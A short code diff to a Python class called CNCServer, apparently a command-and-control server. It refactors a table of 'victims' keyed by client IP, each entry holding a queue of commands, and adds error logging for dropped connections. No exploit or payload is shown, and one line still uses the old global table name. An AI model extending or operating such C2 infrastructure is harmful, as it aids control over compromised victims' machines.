@@ -21,10 +21,10 @@ class CNCServer(CNCBaseServer):
     # ip가 테이블에 없으면 추가
     def _update_victim_tbl(self):
 
-        if self.client_ip in victims_table:
-            return
+        if self.client_ip in self.victims_table:
+            return 
         
-        victims_table[self.client_ip] = {
+        self.victims_table[self.client_ip] = {
             'index' : str(len(victims_table)+1), 
             'command' : deque(), 
             'seq_name' : "",
@@ -67,11 +67,9 @@ class CNCServer(CNCBaseServer):
             print(str(e))
             return self._response_error(ERROR_CODE.INVALID_HEADER_ERROR)
         except ConnectionResetError as e:
-            # TODO log
-            pass
+            logger.error('{0} : Connection Error'.format(self.client_ip))
         except BrokenPipeError as e:
-            # TODO log
-            pass
+            logger.error('{0} : Connection Error'.format(self.client_ip))
         
 
 def server_open():
